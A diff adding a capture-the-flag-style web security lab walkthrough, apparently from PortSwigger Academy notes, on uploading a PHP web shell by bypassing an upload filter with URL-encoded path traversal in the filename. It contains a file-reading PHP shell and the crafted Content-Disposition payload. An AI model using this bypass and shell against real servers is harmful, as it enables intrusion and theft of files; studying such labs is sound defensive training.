@@ -151,7 +151,30 @@ You can log in to your own account using the following credentials: wiener:peter
 
 ### Web shell upload via path traversal
 
+Background:
 
+```
+This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.
+
+To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
+
+You can log in to your own account using the following credentials: wiener:peter 
+```
+
+- log in and upload an image as your avatar, then go back to the account page
+- in burp go to `proxy > http history` and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>` and send it to repeater
+- on your system create a file called exploit.php containing this: `<?php echo file_get_contents('/home/carlos/secret'); ?>`
+- upload the script and notice you don't get blocked based on it being a php file
+- in repeater go to the tab containing the `GET /files/avatars/<YOUR-IMAGE>` request, in the path replace the name of your image file with exploit.php and send the request, observe that instead of executing the script and returning output, it just served it as a txt file
+- in burps history find the `POST /my-account/avatar` and send it to repeater
+- change the `POST /my-account/avatar` requests `Content-Disposition` headers `filename` to include a directory traversal sequence: `Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
+- upload and notice the response `The file avatars/exploit.php has been uploaded`, this means the directory traversal was stripped
+- now obfuscate the directory traversal with URL encoding the slash character `/`: `filename="..%2fexploit.php"`
+- send the request and observe that the message now says: `The file avatars/../exploit.php has been uploaded`, inidcating the file name is being URL decoded by the server
+- go back to your account page
+- find the `GET /files/avatars/..%2fexploit.php` and observe that carlos' secret was returned in the response
+
+### 
 
 
 
